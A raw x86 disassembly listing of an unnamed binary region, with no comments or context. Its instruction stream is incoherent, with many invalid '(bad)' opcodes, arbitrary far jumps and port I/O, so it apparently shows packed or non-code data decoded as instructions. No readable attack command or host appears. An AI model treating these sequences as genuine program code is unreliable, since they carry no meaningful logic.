  429d90:	dec    edx
  429d91:	or     dh,BYTE PTR [edx]
  429d93:	dec    esp
  429d94:	addr16 push ds
  429d96:	das    
  429d97:	mov    edx,0xf93ed2df
  429d9c:	mov    bh,0xbd
  429d9e:	pushfw 
  429da0:	neg    BYTE PTR [ebx-0x7c]
  429da3:	mov    BYTE PTR [edx+0x5dc48d59],bl
  429da9:	dec    eax
  429daa:	pop    eax
  429dab:	imul   ecx,DWORD PTR [edx],0x59a16038
  429db1:	and    eax,0x9dfec95c
  429db6:	cmp    bl,dh
  429db8:	dec    edi
  429db9:	cmc    
  429dba:	dec    edx
  429dbb:	cld    
  429dbc:	mov    edx,edx
  429dbe:	add    BYTE PTR [edi+0x38],bl
	...
  429e31:	add    BYTE PTR [eax],al
  429e33:	add    BYTE PTR [edi+0x5d],cl
  429e36:	pop    ecx
  429e37:	sbb    DWORD PTR [ebx-0x79],0xffffffdf
  429e3b:	fstp   QWORD PTR [eax+0x2e4e2ee0]
  429e41:	mov    ecx,0xbbec4442
  429e46:	add    DWORD PTR [eax],eax
  429e48:	cmc    
  429e49:	add    BYTE PTR [eax],al
  429e4b:	add    BYTE PTR [eax],cl
  429e4d:	cmp    dh,BYTE PTR [ecx-0x6259c70c]
  429e53:	jge    0x429eba
  429e55:	in     eax,0x4f
  429e57:	add    edx,edx
  429e59:	retf   
  429e5a:	mov    edx,ebx
  429e5c:	and    BYTE PTR ds:0x33b8e928,ch
  429e62:	gs xchg ebx,eax
  429e64:	mov    ebp,0xf05e0adb
  429e69:	psadbw mm0,mm3
  429e6c:	fld    QWORD PTR [edi+edi*2]
  429e6f:	mov    WORD PTR [ebx],es
  429e71:	retf   
  429e72:	imul   eax,DWORD PTR [ebp+0x51],0x8
  429e76:	call   0xc28c1684
  429e7b:	lahf   
  429e7c:	out    0x23,eax
  429e7e:	repz call 0x8b5c:0xa961bf5a
  429e86:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  429e87:	xchg   esi,eax
  429e88:	int    0xd
  429e8a:	adc    ch,BYTE PTR [ecx]
  429e8c:	mov    edx,DWORD PTR [edi]
  429e8e:	cmp    dl,ch
  429e90:	jne    0x429edf
  429e92:	shl    BYTE PTR [edi+ecx*2+0x66],0xa1
  429e97:	xchg   edi,eax
  429e98:	sbb    BYTE PTR [ebp+0x64f79a73],bh
  429e9e:	jo     0x429ec4
  429ea0:	mov    eax,0x76ffcddf
  429ea5:	retf   0x7ea2
  429ea8:	pop    ss
  429ea9:	cmp    eax,0xb71ab91
  429eae:	ret    0x2e42
  429eb1:	jns    0x429f1c
  429eb3:	inc    esi
  429eb4:	(bad)  
  429eb5:	adc    DWORD PTR [esi+0x97baa1c],edi
  429ebb:	mov    esi,0x30310d0f
  429ec0:	jne    0x429ebd
  429ec2:	jecxz  0x429edb
  429ec4:	ficomp WORD PTR ds:0x78922ba7
  429eca:	sub    al,BYTE PTR [edi+0x1e]
  429ecd:	out    dx,al
  429ece:	add    eax,0xa31504d
  429ed3:	fisubr DWORD PTR [eax-0x1e8475c]
  429ed9:	outs   dx,BYTE PTR ds:[esi]
  429eda:	sahf   
  429edb:	xor    BYTE PTR [edx],0xbc
  429ede:	and    DWORD PTR [eax-0x3c8a74c4],edx
  429ee4:	aas    
  429ee5:	adc    al,BYTE PTR [esi]
  429ee7:	push   ebp
  429ee8:	icebp  
  429ee9:	pop    es
  429eea:	cld    
  429eeb:	xchg   ebp,eax
  429eec:	sbb    BYTE PTR [ecx-0x61],0xaa
  429ef0:	addr16 push 0x727079dc
  429ef6:	fcomp  DWORD PTR [edx]
  429ef8:	daa    
  429ef9:	jnp    0x429ee0
  429efb:	ret    
  429efc:	jg     0x429f49
  429efe:	out    0x63,eax
  429f00:	xor    BYTE PTR [ecx+esi*2+0xd190596],bl
  429f07:	inc    edi
  429f08:	sbb    eax,0x594a2d20
  429f0d:	or     esp,DWORD PTR [ecx]
  429f0f:	popf   
  429f10:	mov    cl,bl
  429f12:	and    eax,0x1286adf3
  429f17:	pop    es
  429f18:	mov    eax,0x2743e4af
  429f1d:	aad    0x2a
  429f1f:	push   ss
  429f20:	lea    ebx,[edx+eax*2-0x13]
  429f24:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  429f25:	add    ch,dl
  429f27:	dec    ebp
  429f28:	xor    DWORD PTR [edi],ecx
  429f2a:	jo     0x429f66
  429f2c:	shld   DWORD PTR [ecx+0x4d],esp,cl
  429f30:	imul   ebx,DWORD PTR [ebp-0x1f603613],0xda076339
  429f3a:	ficom  DWORD PTR [edi+0x78]
  429f3d:	bound  esi,QWORD PTR [esi]
  429f3f:	push   ecx
  429f40:	lock add BYTE PTR [eax],al
	...
  429fb3:	add    cl,ah
  429fb5:	in     al,dx
  429fb6:	mov    ebx,es
  429fb8:	(bad)  
  429fb9:	jecxz  0x429faa
  429fbb:	out    dx,al
  429fbc:	sub    dh,BYTE PTR [eax-0x47d49285]
  429fc2:	outs   dx,BYTE PTR ds:[esi]
  429fc3:	sub    eax,0x1bce1
  429fc8:	cmc    
  429fc9:	add    BYTE PTR [eax],al
  429fcb:	add    BYTE PTR [ebx],dl
  429fcd:	cld    
  429fce:	jl     0x429fb9
  429fd0:	aam    0xb7
  429fd2:	mov    WORD PTR [edi+0x6c12f841],fs
  429fd8:	loop   0x42a022
  429fda:	std    
  429fdb:	call   0x5973ac3e
  429fe0:	dec    edx
  429fe1:	xchg   esp,eax
  429fe2:	jle    0x42a037
  429fe4:	int3   
  429fe5:	cmp    eax,0x2591d725
  429fea:	jo     0x42a018
  429fec:	pcmpeqb mm0,QWORD PTR fs:[esi-0x1b]
  429ff1:	cs xchg ecx,edx
  429ff4:	jmp    0xc02c4e3a
  429ff9:	(bad)  
  429ffa:	in     al,0x3d
  429ffc:	pop    ecx
  429ffd:	iret   
  429ffe:	mov    dh,0x69
  42a000:	mov    ebp,0x6224323
  42a005:	pop    ss
  42a006:	mov    BYTE PTR [edi],0xf0
  42a009:	das    
  42a00a:	and    dh,0x4
  42a00d:	dec    esi
  42a00e:	mov    DWORD PTR [edi-0x7],eax
  42a011:	mov    ebp,DWORD PTR [eax+0x739ca32e]
  42a017:	xchg   DWORD PTR [edx+0x25824e37],ecx
  42a01d:	rol    ebx,0x0
  42a020:	dec    edi
  42a021:	out    dx,eax
  42a022:	scas   eax,DWORD PTR es:[edi]
  42a023:	add    al,0xee
  42a025:	mov    eax,ds:0xe096cb68
  42a02a:	les    ebp,FWORD PTR [edx+0x740a4840]
  42a030:	xor    cl,0x57
  42a033:	pop    ss
  42a034:	jl     0x42a08b
  42a036:	ret    
  42a037:	xor    BYTE PTR [esi+ebp*2-0x14],ch
  42a03b:	adc    eax,0xc017fe5
  42a040:	add    eax,0x34f2a76a
  42a045:	xor    eax,0xb8fcc840
  42a04a:	or     bh,BYTE PTR [ecx]
  42a04c:	sar    BYTE PTR [edi],0x19
  42a04f:	into   
  42a050:	xchg   edx,eax
  42a051:	jmp    0x42a0ae
  42a053:	inc    ebx
  42a054:	pushf  
  42a055:	push   0x72
  42a057:	fsubr  QWORD PTR [ecx+0x50]
  42a05a:	push   edx
  42a05b:	push   ebp
  42a05c:	xchg   ebp,eax
  42a05d:	cli    
  42a05e:	rcr    DWORD PTR [ebx],cl
  42a060:	shr    BYTE PTR [eax+ebx*8],0x30
  42a064:	xlat   BYTE PTR ds:[ebx]
  42a065:	mov    cl,0x87
  42a067:	sub    al,0x47
  42a069:	jnp    0x42a07f
  42a06b:	and    al,0xc8
  42a06d:	ins    DWORD PTR es:[edi],dx
  42a06e:	fmul   QWORD PTR [ecx]
  42a070:	stc    
  42a071:	das    
  42a072:	sub    al,0x97
  42a074:	(bad)  
  42a075:	ss cmp eax,0x4fe5b1d4
  42a07b:	adc    BYTE PTR [ebx],cl
  42a07d:	cmp    al,0x1b
  42a07f:	es push ebx
  42a081:	mov    DWORD PTR [edi+ecx*1-0x5f12906a],ebp
  42a088:	mov    ebx,0x6c6d66f1
  42a08d:	and    ebp,DWORD PTR [edx+ebx*2-0x1cf8cbe7]
  42a094:	(bad)  
  42a095:	stos   DWORD PTR es:[edi],eax
  42a096:	lock cmps DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42a098:	cmp    DWORD PTR [ebp+0x3c8ad3ab],edi
  42a09e:	pop    esi
  42a09f:	stos   DWORD PTR es:[edi],eax
  42a0a0:	pop    ss
  42a0a1:	shl    BYTE PTR [esi-0x6a3d8a11],1
  42a0a7:	data16 xor BYTE PTR gs:[ebx+0x1e],cl
  42a0ac:	pop    ecx
  42a0ad:	pop    ebp
  42a0ae:	add    cl,ch
  42a0b0:	xchg   DWORD PTR ds:0x63f09f,ebp
  42a0b6:	mov    ecx,DWORD PTR [ebx]
  42a0b8:	jmp    0x7216:0x7ddbafeb
  42a0bf:	outs   dx,DWORD PTR ds:[esi]
  42a0c0:	xor    al,BYTE PTR [eax]
	...
  42a132:	add    BYTE PTR [eax],al
  42a134:	push   esi
  42a135:	xchg   ebp,edi
  42a137:	test   ch,bh
  42a139:	(bad)  
  42a13a:	jg     0x42a113
  42a13c:	jbe    0x42a105
  42a13e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42a13f:	(bad)  
  42a140:	stos   DWORD PTR es:[edi],eax
  42a141:	scas   eax,DWORD PTR es:[edi]
  42a142:	add    al,0x52
  42a144:	(bad)  
  42a145:	mov    ebp,0xf50001
  42a14a:	add    BYTE PTR [eax],al
  42a14c:	shl    bh,0xb3
  42a14f:	jp     0x42a16b
  42a151:	xchg   edi,eax
  42a152:	aam    0xbd
  42a154:	adc    DWORD PTR [edi-0x765e11ba],ebp
  42a15a:	cmp    esp,DWORD PTR [ecx-0x1b2cf572]
  42a160:	push   ds
  42a161:	int3   
  42a162:	dec    ebp
  42a163:	sub    al,0x52
  42a165:	ins    BYTE PTR es:[edi],dx
  42a166:	mov    al,ds:0x3060ff6e
  42a16b:	inc    esp
  42a16c:	cwde   
  42a16d:	adc    bl,BYTE PTR [edx]
  42a16f:	jecxz  0x42a16e
  42a171:	retf   
  42a172:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42a173:	mov    esi,0x4c8fdb0e
  42a178:	data16 lods al,BYTE PTR ds:[esi]
  42a17a:	jmp    0x47f7:0xe10e1b41
  42a181:	div    DWORD PTR cs:[edi+esi*2-0x56658abb]
  42a189:	sar    DWORD PTR [esi+0x66],cl
  42a18c:	not    BYTE PTR [ebx+eiz*2]
  42a18f:	xsha256 (bad)
  42a190:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42a191:	push   edx
  42a192:	mov    dl,0x83
  42a194:	sbb    al,0x77
  42a196:	(bad)  
  42a197:	pop    ebp
  42a198:	idiv   BYTE PTR [ebp+0x260ee0d7]
  42a19e:	sbb    ch,al
  42a1a0:	lock sub al,0x80
  42a1a3:	mov    esi,0x84d45606
  42a1a8:	adc    esi,ebx
  42a1aa:	push   edi
  42a1ab:	adc    al,0xd2
  42a1ad:	es adc esi,eax
  42a1b0:	xor    DWORD PTR [edi],0x5b6376ea
  42a1b6:	pop    edx
  42a1b7:	int3   
  42a1b8:	int3   
  42a1b9:	jle    0x42a204
  42a1bb:	and    esp,DWORD PTR [ebx]
  42a1bd:	xchg   ecx,eax
  42a1be:	sti    
  42a1bf:	push   eax
  42a1c0:	xchg   edx,eax
  42a1c1:	sub    eax,0xcb190e52
  42a1c6:	fwait
  42a1c7:	into   
  42a1c8:	push   edx
  42a1c9:	imul   esp,DWORD PTR [ebp+esi*4-0x3c],0xe30cfc6e
  42a1d1:	repz xchg edi,esp
  42a1d4:	xchg   ebx,eax
  42a1d5:	sti    
  42a1d6:	jge    0x42a1b7
  42a1d8:	jle    0x42a1f9
  42a1da:	in     eax,0xaa
  42a1dc:	push   esp
  42a1dd:	je     0x42a248
  42a1df:	push   ebx
  42a1e0:	or     ah,BYTE PTR [edi-0x18]
  42a1e3:	dec    eax
  42a1e4:	and    al,0xc6
  42a1e6:	popa   
  42a1e7:	out    dx,eax
  42a1e8:	mov    ecx,0xd08f3353
  42a1ed:	dec    ebp
  42a1ee:	mov    edi,0x14ab6c48
  42a1f3:	xor    esi,edi
  42a1f5:	jle    0x42a276
  42a1f7:	push   ecx
  42a1f8:	data16 jmp 0x42a278
  42a1fb:	je     0x42a1d7
  42a1fd:	dec    esp
  42a1fe:	sbb    ebx,DWORD PTR [ecx+0x77a116b0]
  42a204:	popf   
  42a205:	ss xchg esi,eax
  42a207:	inc    esp
  42a208:	cmp    al,BYTE PTR [eax+0x79]
  42a20b:	jge    0x42a224
  42a20d:	js     0x42a21b
  42a20f:	ret    0x590f
  42a212:	inc    edi
  42a213:	pop    ebx
  42a214:	push   ebp
  42a215:	push   0x92e92795
  42a21a:	xchg   ecx,eax
  42a21b:	or     BYTE PTR [edx],cl
  42a21d:	xor    al,0xa7
  42a21f:	xor    al,0x47
  42a221:	dec    edx
  42a222:	jle    0x42a25a
  42a224:	sub    eax,0x5c5a3ded
  42a229:	(bad)  
  42a22a:	es pop ebp
  42a22c:	push   ds
  42a22d:	or     al,0xea
  42a22f:	iret   
  42a230:	loop   0x42a201
  42a232:	sahf   
  42a233:	add    al,0x8e
  42a235:	sub    esi,DWORD PTR [esi]
  42a237:	sbb    al,0x8a
  42a239:	jns    0x42a1c5
  42a23b:	cmp    ebx,DWORD PTR [edi+0x74]
  42a23e:	xor    esp,edx
  42a240:	jp     0x42a242
	...
  42a2b2:	add    BYTE PTR [eax],al
  42a2b4:	lock adc al,0xe1
  42a2b7:	(bad)  
  42a2b8:	in     eax,0xff
  42a2ba:	call   FWORD PTR [esi]
  42a2bc:	xor    eax,0x497f8ab9
  42a2c1:	sbb    cl,bh
  42a2c3:	(bad)  
  42a2c4:	retf   
  42a2c5:	mov    esi,0xf50001
  42a2ca:	add    BYTE PTR [eax],al
  42a2cc:	adc    dh,BYTE PTR [edx]
  42a2ce:	int    0x26
  42a2d0:	(bad)  
  42a2d1:	loopne 0x42a27d
  42a2d3:	pop    es
  42a2d4:	push   edx
  42a2d5:	hlt    
  42a2d6:	into   
  42a2d7:	(bad)  
  42a2d8:	test   eax,0xed6e59bd
  42a2dd:	sub    ah,ch
  42a2df:	sub    ecx,DWORD PTR [esi-0x57d1a03b]
  42a2e5:	leave  
  42a2e6:	xor    BYTE PTR [ecx+0x2f],ch
  42a2e9:	xchg   edi,eax
  42a2ea:	adc    BYTE PTR [edi-0x4c],0x45
  42a2ee:	js     0x42a2ba
  42a2f0:	test   eax,0x66380904
  42a2f5:	sbb    eax,0x676166e7
  42a2fa:	and    al,0xc0
  42a2fc:	(bad)  
  42a2fd:	pop    esp
  42a2fe:	arpl   WORD PTR [eax-0x69],ax
  42a301:	scas   al,BYTE PTR es:[edi]
  42a302:	stos   DWORD PTR es:[edi],eax
  42a303:	loopne 0x42a330
  42a305:	fs in  eax,dx
  42a307:	xlat   BYTE PTR ds:[ebx]
  42a308:	and    ch,ah
  42a30a:	das    
  42a30b:	cmc    
  42a30c:	xchg   BYTE PTR [edi],ah
  42a30e:	pop    es
  42a30f:	ss stc 
  42a311:	repz mov ds:0xd1c6b328,al
  42a317:	push   edx
  42a318:	dec    eax
  42a319:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42a31a:	and    ecx,DWORD PTR [ebx]
  42a31c:	mov    WORD PTR [esi-0x45878e9e],ds
  42a322:	mov    al,0x0
  42a324:	rcl    BYTE PTR [ebp-0x40],1
  42a327:	outs   dx,DWORD PTR ds:[esi]
  42a328:	jo     0x42a2f4
  42a32a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42a32b:	or     esp,edx
  42a32d:	add    ah,al
  42a32f:	xor    DWORD PTR ds:0xbb9226d9,ecx
  42a335:	data16 neg al
  42a338:	rcr    BYTE PTR [edi+0x6b],0x7c
  42a33c:	pop    edi
  42a33d:	ret    
  42a33e:	loope  0x42a3a5
  42a340:	cld    
  42a341:	push   edi
  42a342:	aas    
  42a343:	call   0xa4b5:0xc7ad7609
  42a34a:	cmp    al,0x4e
  42a34d:	push   ebp
  42a34e:	stc    
  42a34f:	push   cs
  42a350:	or     al,BYTE PTR [esi]
  42a352:	test   al,0xd1
  42a354:	lods   eax,DWORD PTR ds:[esi]
  42a355:	jmp    0x42a381
  42a357:	jge    0x42a387
  42a359:	outs   dx,BYTE PTR ds:[esi]
  42a35a:	das    
  42a35b:	out    dx,al
  42a35c:	ret    
  42a35d:	jno    0x42a376
  42a35f:	add    DWORD PTR [ecx-0x56],edi
  42a362:	aaa    
  42a363:	push   edi
  42a364:	adc    esi,DWORD PTR [edi]
  42a366:	inc    esp
  42a367:	xchg   esp,eax
  42a368:	or     BYTE PTR [edi+0x43898416],bh
  42a36e:	imul   esp,DWORD PTR [ebp-0x2d195297],0x3684beff
  42a378:	adc    ecx,DWORD PTR ds:0xa9c5d854
  42a37e:	(bad)  
  42a37f:	cmp    dh,bh
  42a381:	rcl    BYTE PTR [edi],cl
  42a383:	outs   dx,BYTE PTR ds:[esi]
  42a384:	sub    al,0x28
  42a386:	xchg   edi,eax
  42a387:	dec    ecx
  42a388:	jge    0x42a310
  42a38a:	mov    ebx,0x6a160530
  42a38f:	int    0x5c
  42a391:	adc    cl,BYTE PTR [ebp-0x3e98f35d]
  42a397:	cld    
  42a398:	and    DWORD PTR [ebx-0x56b089ae],ebp
  42a39e:	inc    edx
  42a39f:	xchg   BYTE PTR [edi-0x5dd6e2b0],ch
  42a3a5:	fidiv  DWORD PTR [ebp-0x4a694ecf]
  42a3ab:	ins    BYTE PTR es:[edi],dx
  42a3ac:	idiv   BYTE PTR [edi+0x12055088]
  42a3b2:	scas   al,BYTE PTR es:[edi]
  42a3b3:	popf   
  42a3b4:	add    al,0x26
  42a3b6:	cld    
  42a3b7:	pop    ebx
  42a3b8:	aaa    
  42a3b9:	push   0x18
  42a3bb:	jecxz  0x42a3a4
  42a3bd:	xchg   DWORD PTR [ecx],esp
  42a3bf:	ja     0x42a366
	...
  42a431:	add    BYTE PTR [eax],al
  42a433:	add    BYTE PTR [ebp+ecx*1+0x13],cl
  42a437:	sub    al,0x53
  42a439:	ds jg  0x42a4a9
  42a43c:	stos   BYTE PTR es:[edi],al
  42a43d:	dec    ebx
  42a43e:	push   edi
  42a43f:	jo     0x42a3da
  42a441:	repz (bad) 
  42a443:	xchg   eax,eax
  42a445:	mov    edi,0xf50001
  42a44a:	add    BYTE PTR [eax],al
  42a44c:	add    dl,BYTE PTR [esi+0x20a2d1d9]
  42a452:	inc    esi
  42a453:	jo     0x42a434
  42a455:	mov    ecx,0x69b55e8e
  42a45a:	repz jge 0x42a425
  42a45d:	pop    ds
  42a45e:	sub    bh,BYTE PTR [ebp+0x4801a0f1]
  42a464:	sar    BYTE PTR [ebp-0x77],cl
  42a467:	xor    al,0x76
  42a469:	lods   eax,DWORD PTR ds:[esi]
  42a46a:	(bad)  
  42a46b:	retf   
  42a46c:	xor    eax,0xd66d4833
  42a471:	push   ecx
  42a472:	retf   
  42a473:	outs   dx,BYTE PTR ds:[esi]
  42a474:	sbb    al,0xcf
  42a476:	push   ebp
  42a477:	dec    esi
  42a478:	fidiv  WORD PTR [esi-0x6fb9e61e]
  42a47e:	adc    eax,0x5edc3839
  42a483:	into   
  42a484:	add    BYTE PTR [esi-0x6b],ah
  42a487:	(bad)  
  42a488:	(bad)  
  42a48a:	mov    esp,0x817d242
  42a48f:	sbb    edx,esi
  42a491:	or     esi,ebx
  42a493:	enter  0x90cd,0xc3
  42a497:	and    DWORD PTR [edx+ebp*1-0x3a],ecx
  42a49b:	sub    eax,0xcaa5d549
  42a4a0:	bound  ebp,QWORD PTR [ecx]
  42a4a2:	cmc    
  42a4a3:	in     eax,dx
  42a4a4:	inc    ebp
  42a4a5:	adc    ebp,DWORD PTR [ecx]
  42a4a7:	(bad)
  42a4aa:	or     BYTE PTR [esi+0x3a],dl
  42a4ad:	xchg   BYTE PTR [eax+0x1d],bh
  42a4b0:	loopne 0x42a502
  42a4b2:	dec    eax
  42a4b3:	popf   
  42a4b4:	in     al,0xdb
  42a4b6:	(bad)  
  42a4b7:	cmp    BYTE PTR [eax],bh
  42a4b9:	lea    ecx,[eax]
  42a4bb:	fistp  QWORD PTR [edi-0x44b682be]
  42a4c1:	js     0x42a44d
  42a4c3:	daa    
  42a4c4:	push   ss
  42a4c5:	xor    esi,DWORD PTR [ebp+0x6c85c662]
  42a4cb:	inc    ecx
  42a4cc:	les    ebp,FWORD PTR [edi+ecx*2+0x30e34501]
  42a4d3:	scas   eax,DWORD PTR es:[edi]
  42a4d4:	push   ebx
  42a4d6:	sti    
  42a4d7:	inc    ecx
  42a4d8:	push   edi
  42a4d9:	adc    dl,cl
  42a4db:	cmp    al,0xed
  42a4dd:	mov    dl,0xe7
  42a4df:	sbb    BYTE PTR [edx],ah
  42a4e1:	and    DWORD PTR [edx-0x34bb7c65],0x6e
  42a4e8:	sub    al,0x6
  42a4ea:	int    0x27
  42a4ec:	aaa    
  42a4ed:	fst    DWORD PTR [esi]
  42a4ef:	fcomp  QWORD PTR [ebp+0x5f9ccfc1]
  42a4f5:	mov    edx,0xe6791dea
  42a4fa:	fld    QWORD PTR [eax-0x78]
  42a4fd:	daa    
  42a4fe:	test   al,0xb9
  42a500:	ss fld st(7)
  42a503:	push   ss
  42a504:	std    
  42a505:	jb     0x42a560
  42a507:	cmp    eax,ebp
  42a509:	jbe    0x42a51a
  42a50b:	mov    WORD PTR [eax+0x3800012],ds
  42a511:	adc    BYTE PTR [ebp+0x2f],bh
  42a514:	adc    eax,0x2e16a41f
  42a519:	sbb    al,0x2a
  42a51b:	mul    DWORD PTR [edx+0x1be81963]
  42a521:	mov    ds:0xfe2468ad,eax
  42a526:	xchg   ebp,eax
  42a527:	idiv   BYTE PTR [eax-0x29]
  42a52a:	daa    
  42a52b:	or     ecx,ecx
  42a52d:	add    ebp,DWORD PTR [ecx+edx*4+0x6a]
  42a531:	cmp    eax,0x668cc6bd
  42a536:	les    edi,FWORD PTR [esi]
  42a538:	adc    eax,0x1c1a56e0
  42a53d:	or     esp,esp
  42a53f:	adc    DWORD PTR [esi+0x0],ebx
	...
  42a5b2:	add    BYTE PTR [eax],al
  42a5b4:	ins    DWORD PTR es:[edi],dx
  42a5b5:	sbb    eax,0xfbf6c0e6
  42a5ba:	outs   dx,DWORD PTR ds:[esi]
  42a5bb:	mov    ebp,0x44d94d2c
  42a5c0:	test   al,0x9e
  42a5c2:	or     ah,BYTE PTR [esi*4-0xafffe40]
  42a5c9:	add    BYTE PTR [eax],al
  42a5cb:	add    ch,dh
  42a5cd:	mov    eax,0x3a7e355d
  42a5d2:	and    cl,dh
  42a5d4:	inc    esp
  42a5d5:	fnsave [ebx+0x546776f7]
  42a5db:	ss pop esp
  42a5dd:	pushf  
  42a5de:	pop    ebx
  42a5df:	xor    esp,DWORD PTR [eax]
  42a5e1:	jmp    DWORD PTR [edx+0x62e47e21]
  42a5e7:	pop    edi
  42a5e8:	arpl   WORD PTR [esi],si
  42a5ea:	inc    edx
  42a5eb:	cmp    eax,0x8028aa68
  42a5f0:	xor    ebx,edx
  42a5f2:	push   eax
  42a5f3:	sbb    dl,BYTE PTR [esi-0x12]
  42a5f6:	stos   BYTE PTR es:[edi],al
  42a5f7:	cmp    DWORD PTR [eax],ebx
  42a5f9:	xchg   edx,eax
  42a5fa:	les    ebx,FWORD PTR [eax+0x2e]
  42a5fd:	jnp    0x42a5cf
  42a5ff:	mov    WORD PTR [eax-0x3a],fs
  42a602:	pop    ecx
  42a603:	pusha  
  42a604:	cmc    
  42a605:	xchg   ecx,eax
  42a606:	xchg   BYTE PTR [ebp-0x5d580920],bl
  42a60c:	out    0x38,eax
  42a60e:	add    BYTE PTR [ebp-0x71],dl
  42a611:	xchg   esp,eax
  42a612:	out    dx,al
  42a613:	sti    
  42a614:	call   0x4c54b258
  42a619:	mov    eax,ds:0x694a7ad9
  42a61e:	retf   0x2931
  42a621:	xor    BYTE PTR [ebp-0x6a],ah
  42a624:	call   0x1748:0xadad9368
  42a62b:	jbe    0x42a5b6
  42a62d:	aas    
  42a62e:	sub    BYTE PTR [ebp+0x7b],dl
  42a631:	mov    eax,ds:0xc8e40315
  42a636:	xchg   esi,eax
  42a637:	mul    BYTE PTR ds:[edx+0x20]
  42a63b:	repnz sbb BYTE PTR [edx+0x566ab99c],cl
  42a642:	cmp    eax,0x6ce02884
  42a647:	(bad)  
  42a648:	outs   dx,BYTE PTR ds:[esi]
  42a649:	loop   0x42a6b7
  42a64b:	jecxz  0x42a609
  42a64d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42a64e:	js     0x42a62b
  42a650:	pop    ecx
  42a651:	sbb    dl,BYTE PTR [ebx+0x11ba00a9]
  42a657:	pop    ss
  42a658:	sbb    al,0xcd
  42a65a:	sub    eax,0x9e2df523
  42a65f:	push   cs
  42a660:	sub    cl,bl
  42a662:	sub    al,0x86
  42a664:	mov    esp,0xea25d0a9
  42a669:	or     BYTE PTR [edx],bh
  42a66b:	or     al,0x9f
  42a66d:	lods   eax,DWORD PTR ds:[esi]
  42a66e:	add    bp,ax
  42a671:	popf   
  42a672:	mov    ah,0xde
  42a674:	into   
  42a675:	mov    esp,0x11a7e659
  42a67a:	loopne 0x42a615
  42a67c:	jbe    0x42a63f
  42a67e:	and    BYTE PTR [ebx],0x47
  42a681:	gs xor eax,0xdd6f5c77
  42a687:	enter  0x9b48,0xed
  42a68b:	xchg   ebp,eax
  42a68c:	test   esp,edx
  42a68e:	adc    al,0xff
  42a690:	call   0x7314:0xf3e6146d
  42a697:	std    
  42a698:	ja     0x42a6e6
  42a69a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42a69b:	mov    WORD PTR [ecx-0x3a],gs
  42a69e:	mov    BYTE PTR [edi+0x1d],0xa1
  42a6a2:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42a6a3:	mov    ecx,0x2299b0af
  42a6a8:	dec    esp
  42a6a9:	inc    esi
  42a6aa:	loop   0x42a69a
  42a6ac:	jle    0x42a693
  42a6ae:	retf   
  42a6af:	stos   DWORD PTR es:[edi],eax
  42a6b0:	inc    eax
  42a6b1:	(bad)  
  42a6b2:	es pop ecx
  42a6b4:	shr    DWORD PTR [edi+0x73],1
  42a6b7:	mov    ch,0xd5
  42a6b9:	das    
  42a6ba:	lods   eax,DWORD PTR ds:[esi]
  42a6bb:	mov    ch,0x4
  42a6bd:	xchg   ecx,eax
  42a6be:	mov    ecx,esp
  42a6c0:	out    0x0,al
	...
  42a732:	add    BYTE PTR [eax],al
  42a734:	xor    BYTE PTR [edx-0x21],al
  42a737:	(bad)  
  42a738:	(bad)  
  42a739:	(bad)  
  42a73a:	mov    ebp,0xffb84452
  42a73f:	cdq    
  42a740:	mov    edi,0xaaa15911
  42a745:	rol    DWORD PTR [ecx],0x0
  42a748:	cmc    
  42a749:	add    BYTE PTR [eax],al
  42a74b:	add    BYTE PTR [edi-0x21],cl
  42a74e:	imul   esp,edx,0xffffffdd
  42a751:	ret    0x96e4
  42a754:	xchg   DWORD PTR [esi-0x57],ebx
  42a757:	ins    BYTE PTR es:[edi],dx
  42a758:	jno    0x42a7a8
  42a75a:	mov    ah,0x14
  42a75c:	ss sbb al,dl
  42a75f:	adc    dl,BYTE PTR [ebp-0x628d6760]
  42a765:	fwait
  42a766:	xchg   esi,eax
  42a767:	pop    eax
  42a768:	jp     0x42a713
  42a76a:	inc    ebx
  42a76b:	in     al,0xae
  42a76d:	das    
  42a76e:	mov    dl,0xe0
  42a770:	mov    ebp,0x5860f35b
  42a775:	out    0x28,al
  42a777:	into   
  42a778:	jl     0x42a7c4
  42a77a:	hlt    
  42a77b:	and    eax,0x94391108
  42a780:	ret    
  42a781:	xor    BYTE PTR [ebx],cl
  42a783:	jmp    0xd551:0x83f79522
  42a78a:	inc    ebp
  42a78b:	xchg   ebx,eax
  42a78c:	lods   eax,DWORD PTR ds:[esi]
  42a78d:	pop    ds
  42a78e:	loopne 0x42a797
  42a790:	sub    ebp,DWORD PTR [esi+0x32]
  42a793:	and    dl,bh
  42a795:	outs   dx,DWORD PTR ds:[esi]
  42a796:	std    
  42a797:	sbb    eax,0x87aaa35f
  42a79c:	mov    dh,0x68
  42a79e:	out    0xe,al
  42a7a0:	cmps   WORD PTR ds:[esi],WORD PTR es:[edi]
  42a7a2:	jmp    0xc79a:0x65c8c6f3
  42a7a9:	inc    esp
  42a7aa:	lods   eax,DWORD PTR ds:[esi]
  42a7ab:	inc    ebx
  42a7ac:	les    ebx,FWORD PTR [eax-0x6a]
  42a7af:	pop    esp
  42a7b0:	pop    edi
  42a7b1:	jge    0x42a82a
  42a7b3:	mov    esi,0x115a63bd
  42a7b8:	mov    bh,0xd6
  42a7ba:	addr16 lahf 
  42a7bc:	mul    dh
  42a7be:	push   edx
  42a7bf:	repnz push esp
  42a7c1:	pop    eax
  42a7c2:	add    BYTE PTR [eax+0x7be57192],ch
  42a7c8:	dec    BYTE PTR [eax+0x17]
  42a7cb:	and    al,0xa4
  42a7cd:	mov    cl,0xd6
  42a7cf:	rcr    ecx,1
  42a7d1:	xor    al,0x78
  42a7d3:	pop    esi
  42a7d4:	jmp    0xb49d:0x15b3201b
  42a7db:	lods   eax,DWORD PTR ds:[esi]
  42a7dc:	jp     0x42a771
  42a7de:	xchg   esp,eax
  42a7df:	lahf   
  42a7e0:	fist   WORD PTR [edi]
  42a7e2:	sub    al,0x3f
  42a7e4:	pop    esi
  42a7e5:	rcr    BYTE PTR [edi-0x42],cl
  42a7e8:	sbb    eax,0x3a51bc94
  42a7ed:	or     BYTE PTR [ebp-0x7d],0x65
